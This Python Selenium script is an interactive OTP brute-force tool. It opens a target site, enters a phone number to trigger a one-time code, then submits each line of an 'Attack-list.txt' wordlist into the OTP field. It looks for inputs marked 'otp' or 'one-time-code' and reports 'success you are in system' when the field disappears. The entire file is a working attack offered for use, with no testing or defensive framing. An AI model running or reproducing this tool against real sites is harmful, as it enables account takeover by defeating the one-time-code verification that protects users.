# interactive_search_open_first_optional_phone.py
# Usage: python interactive_search_open_first_optional_phone.py
# Requirements: pip install selenium webdriver-manager

import time
import os
import socket
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Try to use webdriver_manager if available (fallback to Selenium Manager if not)
def create_chrome_service():
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        path = ChromeDriverManager().install()
        return Service(path)
    except Exception:
        return None

def normalize_url(u: str) -> str:
    u = u.strip()
    if not u:
        raise ValueError("Empty URL provided.")
    if not u.startswith("http://") and not u.startswith("https://"):
        u = "https://" + u
    return u

def dns_resolves(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.netloc or parsed.path
    if ":" in host:
        host = host.split(":")[0]
    try:
        ip = socket.gethostbyname(host)
        print(f"[DNS] {host} resolved to {ip}")
        return True
    except Exception as e:
        print(f"[DNS] Failed to resolve host '{host}': {e}")
        return False

def wait_for_element(driver, by, selector, timeout=10):
    try:
        return WebDriverWait(driver, timeout).until(EC.presence_of_element_located((by, selector)))
    except Exception:
        return None

def prompt(msg):
    return input(msg).strip()

def main():
    print("\n=== Interactive Selenium (Open browser immediately, then ask) ===\n")

    # 1) URL first
    raw_url = input("1) Enter the site URL (e.g. https://example.com): ").strip()
    try:
        site_url = normalize_url(raw_url)
    except ValueError as e:
        print("Error:", e)
        return

    # Attempt DNS resolve and warn but continue if user wants
    print("\nChecking DNS for the host...")
    if not dns_resolves(site_url):
        cont = input("DNS did not resolve. Continue and try to open the browser anyway? (y/N): ").strip().lower()
        if cont != "y":
            print("Exiting.")
            return

    # Start browser and open the given URL immediately
    print("\n-> Opening browser and loading the URL now...")
    service = create_chrome_service()
    driver = webdriver.Chrome(service=service) if service else webdriver.Chrome()
    driver.set_page_load_timeout(30)
    try:
        driver.get(site_url)
    except Exception as e:
        print("Warning: driver.get() raised an exception:", e)
        print("The browser is still open — you can check it manually.")
    time.sleep(1.5)

    # Optional phone input
    print("\nNow I will ask for the phone + Attack information (you can switch to the opened browser to inspect elements).")
    phone_selector = prompt("\n2) CSS selector for phone input (optional — press Enter to skip): ")
    if phone_selector:
        phone_value = prompt("3) Phone number to enter: ")
        phone_submit_selector = prompt("4) (optional) CSS selector for phone submit button (press Enter to skip): ")

        print("\n-> Locating phone input on the opened page...")
        phone_input = wait_for_element(driver, By.CSS_SELECTOR, phone_selector, timeout=12)
        if not phone_input:
            print("Phone input not found with supplied selector — trying fallback scanning inputs...")
            found = None
            for el in driver.find_elements(By.TAG_NAME, "input"):
                try:
                    if el.is_displayed():
                        name = (el.get_attribute("name") or "").lower()
                        typ = (el.get_attribute("type") or "").lower()
                        if "phone" in name or "tel" in typ or "mobile" in name:
                            found = el
                            break
                except Exception:
                    continue
            phone_input = found

        if not phone_input:
            print("❌ Could not find any phone input on the current page. Please inspect the page and restart the script with the correct selector.")
            driver.quit()
            return

        try:
            phone_input.clear()
        except Exception:
            pass
        try:
            phone_input.send_keys(phone_value)
        except Exception as e:
            print("Warning: failed to send keys to phone input:", e)

        submitted = False
        if phone_submit_selector:
            try:
                btn = driver.find_element(By.CSS_SELECTOR, phone_submit_selector)
                btn.click()
                submitted = True
            except Exception:
                submitted = False

        if not submitted:
            try:
                phone_input.send_keys(Keys.ENTER)
                submitted = True
            except Exception:
                submitted = False

        print("-> Phone entered" + (" and submitted." if submitted else ". Submission may have failed."))

        proceed_after_phone = prompt("\nIf the site asks for OTP or extra steps, do them now in the opened browser. When ready to continue with Attack press Enter (or type 'exit' to quit): ")
        if proceed_after_phone.lower() == "exit":
            print("Exiting by user request.")
            driver.quit()
            return
    else:
        print("-> Skipping phone input — proceeding directly to Attack.")

    # Attack input
    search_selector = prompt("\n5) CSS selector for Attack input: ")
    search_submit_selector = prompt("6) (optional) CSS selector for Attack submit button (press Enter to skip): ")
    list_filename = prompt("7) Attack list filename (default: Attack-list.txt): ") or "Attack-list.txt"

    if not os.path.exists(list_filename):
        print(f"Error: file '{list_filename}' not found in folder: {os.getcwd()}")
        driver.quit()
        return

    with open(list_filename, "r", encoding="utf-8") as f:
        queries = [line.strip() for line in f if line.strip()]

    if not queries:
        print("The Attack Wordlist file is empty.")
        driver.quit()
        return

    print("\n-> Starting Attacking using the opened browser...")
    for idx, q in enumerate(queries, start=1):
        print(f"[{idx}/{len(queries)}] Attacking: {q}")
        search_input = wait_for_element(driver, By.CSS_SELECTOR, search_selector, timeout=8)
        if not search_input:
            try:
                driver.refresh()
            except Exception:
                pass
            time.sleep(0.2)
            search_input = wait_for_element(driver, By.CSS_SELECTOR, search_selector, timeout=6)

        if not search_input:
            fallback = None
            for el in driver.find_elements(By.TAG_NAME, "input"):
                try:
                    if el.is_displayed() and (el.get_attribute("type") in (None, "text", "OTP", "otp", "one-time-code", "")):
                        fallback = el
                        break
                except Exception:
                    continue
            if fallback:
                search_input = fallback

        if not search_input:
            print("⚠️success you are in system✅")
            continue

        try:
            search_input.clear()
        except Exception:
            pass
        try:
            search_input.send_keys(q)
            time.sleep(0.1)
            submitted = False
            if search_submit_selector:
                try:
                    btn = driver.find_element(By.CSS_SELECTOR, search_submit_selector)
                    btn.click()
                    submitted = True
                except Exception:
                    submitted = False
            if not submitted:
                search_input.send_keys(Keys.ENTER)
        except Exception as e:
            print("⚠️ Error while Attacking:", e)
            continue

        time.sleep(0.2)

    print("\ncrack is not seccussful OTP not found")
    driver.quit()

if __name__ == "__main__":
    main()
